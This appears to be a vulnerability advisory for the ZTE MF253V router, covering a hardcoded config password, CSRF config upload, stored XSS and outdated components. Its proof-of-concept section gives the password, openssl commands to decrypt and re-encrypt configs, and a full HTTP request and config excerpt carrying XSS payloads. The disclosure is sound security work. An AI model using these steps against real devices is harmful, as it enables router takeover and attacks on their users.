Business recommendation:
------------------------
The vendor provides a patch via push notifications in the web-interface of the
device. The patch should be installed immediately.

SEC Consult recommends to perform a thorough security review of these
products conducted by security professionals to identify and resolve all
security issues.


Vulnerability overview/description:
-----------------------------------
1) Hardcoded Password for Config File
The device contains a hardcoded password for the config file. Hence, all config
files from devices of the same model can be decrypted and modified by an
attacker for malicious purposes.

2) Config Upload via Cross-Site Request Forgery (CSRF)
A malicious config file can be uploaded by exploiting a CSRF vulnerability. An
attacker can reconfigure the router by luring the user to a crafted web-site.

3) Stored Cross-Site Scripting (XSS)
A cross-site scripting payload can be placed by an authenticated attacker by
intercepting a POST request to "/goform/goform_set_cmd_process" or by abusing
the config upload described in section 2). Thus, an attacker is able to perform
malicious actions in the context of the attacked user.

4) Multiple Outdated Software Components
Multiple outdated software components containing vulnerabilities were found by
the IoT Inspector.


Proof of concept:
-----------------
1) Hardcoded Password for Config File
The script "/usr/zte/zte_conf/scripts/para_backup.sh" contains the hardcoded
password "himan". It is used to prevent tampering with the configuration file.

The initial encrypted configuration can be obtained by logging in and visiting:
"http://$IP/cgi-bin/ExportSettings.sh"

Decryption:
-------------------------------------------------------------------------------
OpenSSL 1.0.1:
openssl enc -d -des-ede3-cbc -in <encrypted-config> -out <decrypted-config> -pass pass:himan
OPENSSL 1.1.1:
openssl enc -d -des-ede3-cbc -md md5 -in <encrypted-config> -out <decrypted-config> -pass pass:himan

Encryption:
-------------------------------------------------------------------------------
OpenSSL 1.0.1:
openssl enc -des-ede3-cbc -in <decrypted-config> -out <encrypted-config> -pass pass:himan
OPENSSL 1.1.1:
openssl enc -des-ede3-cbc -md md5 -in <decrypted-config> -out <encrypted-config> -pass pass:himan

2) Config Upload via Cross-Site Request Forgery (CSRF)
Using the hardcoded password one is able to generate valid config files with
malicious settings. The config file can be uploaded by sending the encrypted
config file to "http://$IP/cgi-bin/upload_settings.cgi" while logged in.

A CSRF vulnerability allows the config to be uploaded to the router by visiting
a malicious website when logged in.

3) Stored Cross-Site Scripting (XSS)
By using an intercepting proxy, one is able to inject an XSS payload into the
POST request, resulting in a stored XSS.

Request:
-------------------------------------------------------------------------------
POST /goform/goform_set_cmd_process HTTP/1.1
Host: $IP
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://$IP/index.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 275
Connection: close

isTest=true&notCallback=true&goformId=WAN_GATEWAYMODE_STATIC&static_wan_ipaddr=$IP<script>alert(document.location)</script>&static_wan_netmask=255.255.255.0&static_wan_gateway=192.168.0.2&static_wan_primary_dns=8.8.8.8&static_wan_secondary_dns=9.9.9.9&WAN_MODE=STATIC
-------------------------------------------------------------------------------

Maliciously changing some config values and uploading the tampered config as
explained in section 2) results in a stored XSS as well:

Malicious config excerpt:
-------------------------------------------------------------------------------
...
imei=860743031081114<script>alert(document.location)</script>
...
-------------------------------------------------------------------------------

4) Multiple Outdated Software Components
The IoT Inspector recognized multiple outdated software components with known
vulnerabilities:

Busybox 1.23.1:                 3 CVEs
OpenSSL 1.0.1k:                 37 CVEs
Curl 7.21.1:                    2 CVEs
Hostapd 2.3:                    21 CVEs
Linux Kernel 3.18.20:   191 CVEs
Dnsmasq 2.78:                   1 CVE


Vulnerable / tested versions:
-----------------------------
The following product/firmware version has been tested:
* ZTE MF253V V1.0.0B04
